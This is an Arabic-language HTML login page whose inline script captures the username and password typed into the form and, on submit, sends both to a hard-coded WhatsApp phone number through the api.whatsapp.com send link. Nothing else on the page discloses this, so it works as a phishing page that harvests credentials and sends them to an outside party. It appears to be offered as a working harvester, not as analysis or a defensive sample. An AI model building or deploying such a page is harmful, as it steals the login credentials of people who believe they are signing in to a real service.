<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
</head>
<body>
    <h2>تسجيل الدخول</h2>
    <form id="loginForm">
        <label for="username">اسم المستخدم:</label><br>
        <input type="text" id="username" name="username" required><br><br>
        <label for="password">كلمة المرور:</label><br>
        <input type="password" id="password" name="password" required><br><br>
        <button type="submit">تسجيل الدخول</button>
    </form>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // إعداد نص الرسالة
            const message = `اسم المستخدم: ${username}\nكلمة المرور: ${password}`;

            // رقم الواتساب الخاص بك مع كود الدولة
            const phoneNumber = "+201016966036";

            // بناء رابط واتساب مع الرسالة
            const whatsappUrl = `https://api.whatsapp.com/send?phone=${phoneNumber}&text=${encodeURIComponent(message)}`;

            // فتح رابط واتساب في نافذة جديدة
            window.open(whatsappUrl, '_blank');
        });
    </script>
</body>
</html>
